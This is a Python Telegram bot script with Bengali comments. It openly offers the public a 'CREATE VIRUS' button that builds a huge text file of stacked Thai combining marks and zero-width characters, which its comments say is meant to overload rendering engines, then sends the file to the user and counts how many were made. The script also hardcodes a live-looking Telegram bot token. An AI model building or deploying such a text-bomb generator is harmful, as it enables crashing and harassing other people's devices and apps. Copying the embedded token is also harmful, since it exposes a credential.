import logging
import sqlite3
import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ১. লগিং সেটআপ (বটের অ্যাক্টিভিটি মনিটর করার জন্য)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ২. আপনার নতুন টোকেন কনফিগারেশন
TOKEN = "8675593212:AAFrbsGfvuO8ld-5FYGv1a5y0975NMDmkes"

# ৩. ডেটাবেস সেটআপ (পরিসংখ্যান সংরক্ষণের জন্য)
def init_db():
    conn = sqlite3.connect('m_r_developer_open_v7.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
    cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
    conn.commit()
    conn.close()

# ৪. অত্যন্ত শক্তিশালী পেলোড তৈরির ফাংশন (লাইভ প্রগ্রেস লজিকসহ)
async def generate_virus_file_live(status_msg):
    filename = "M_R_DEVELOPER_VIRUS.txt"
    # এমন ক্যারেক্টার কম্বিনেশন যা রেন্ডারিং ইঞ্জিনকে ওভারলোড করে
    crash_pattern = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 35
    invisible_mass = "\u200B\u200C\u200D\uFEFF" * 25
    chunk = (crash_pattern + invisible_mass) * 500
    
    try:
        await status_msg.edit_text("⏳ সিস্টেম পেলোড জেনারেট হচ্ছে (২০%)...")
        
        with open(filename, "w", encoding="utf-8") as f:
            for i in range(1, 1201):
                f.write(chunk)
                # নির্দিষ্ট লুপে লাইভ আপডেট আপডেট দেখাবে
                if i == 300:
                    await status_msg.edit_text("⏳ বাফার মেমোরি রাইট হচ্ছে (৫০%)...")
                elif i == 700:
                    await status_msg.edit_text("⏳ ফাইল এনক্রিপশন সম্পন্ন হচ্ছে (৮০%)...")
                elif i == 1100:
                    await status_msg.edit_text("⏳ ডেলিভারির জন্য প্রস্তুত হচ্ছে (৯৫%)...")
        
        await status_msg.edit_text("✅ ১০০% সম্পন্ন! এখন আপনার কাছে পাঠানো হচ্ছে...")
        return filename
    except Exception as e:
        logger.error(f"File Creation Error: {e}")
        return None

# ৫. মেইন মেসেজ এবং বাটন হ্যান্ডলার (সবার জন্য উন্মুক্ত)
async def handle_all_requests(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_name = update.effective_user.first_name

    # স্টার্ট কমান্ড অথবা ড্যাশবোর্ড লোড
    if text == "/start":
        keyboard = [
            [KeyboardButton("🚀 CREATE VIRUS")],
            [KeyboardButton("📊 STATUS")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, persistent=True)
        
        welcome_text = (
            f"🔥 **M R DEVELOPER PUBLIC PANEL** 🔥\n\n"
            f"হ্যালো {user_name}!\n"
            "এই বটটি এখন সবার জন্য উন্মুক্ত। নিচের বাটন ব্যবহার করে ফাইল তৈরি করুন।"
        )
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

    # ভাইরাস ফাইল তৈরির বাটন
    elif text == "🚀 CREATE VIRUS":
        status_msg = await update.message.reply_text("🚀 প্রসেস শুরু হয়েছে, দয়া করে অপেক্ষা করুন...")
        
        # ব্যাকগ্রাউন্ডে লাইভ প্রগ্রেসসহ ফাইল তৈরি
        file_path = await generate_virus_file_live(status_msg)
        
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as doc:
                    await update.message.reply_document(
                        document=doc,
                        caption=(
                            "🔥 **VIRUS FILE CREATED** 🔥\n\n"
                            "✅ ফাইলটি সফলভাবে তৈরি হয়েছে।\n"
                            "⚠️ **সতর্কতা:** এটি শুধুমাত্র পরীক্ষার উদ্দেশ্যে। অন্যকে বিরক্ত করতে ব্যবহার করবেন না।"
                        ),
                        parse_mode='Markdown'
                    )
                
                # পরিসংখ্যান আপডেট
                conn = sqlite3.connect('m_r_developer_open_v7.db')
                cur = conn.cursor()
                cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                conn.commit()
                conn.close()
                
            except Exception as e:
                await update.message.reply_text(f"❌ ফাইল পাঠাতে সমস্যা হয়েছে: {str(e)}")
            finally:
                if os.path.exists(file_path):
                    os.remove(file_path) # সার্ভার স্টোরেজ খালি করা
        else:
            await update.message.reply_text("❌ ফাইল তৈরি করতে ব্যর্থ হয়েছে।")
        
        # প্রগ্রেস মেসেজটি ডিলিট করে দেওয়া
        await status_msg.delete()

    # স্ট্যাটাস চেক করার বাটন
    elif text == "📊 STATUS":
        conn = sqlite3.connect('m_r_developer_open_v7.db')
        cur = conn.cursor()
        cur.execute("SELECT count FROM stats WHERE id=1")
        total_created = cur.fetchone()[0]
        conn.close()
        await update.message.reply_text(f"📊 **বট রিপোর্ট**\n\nএ পর্যন্ত সবাই মিলে মোট {total_created} টি ভাইরাস ফাইল তৈরি করেছে।")

# ৬. মেইন রানার ফাংশন
def main():
    init_db()
    # Conflict এড়াতে drop_pending_updates=True
    application = Application.builder().token(TOKEN).build()
    
    # সব টেক্সট মেসেজ হ্যান্ডল করার জন্য
    application.add_handler(MessageHandler(filters.TEXT, handle_all_requests))
    
    print("M R DEVELOPER Bot is Live for Everyone...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
        
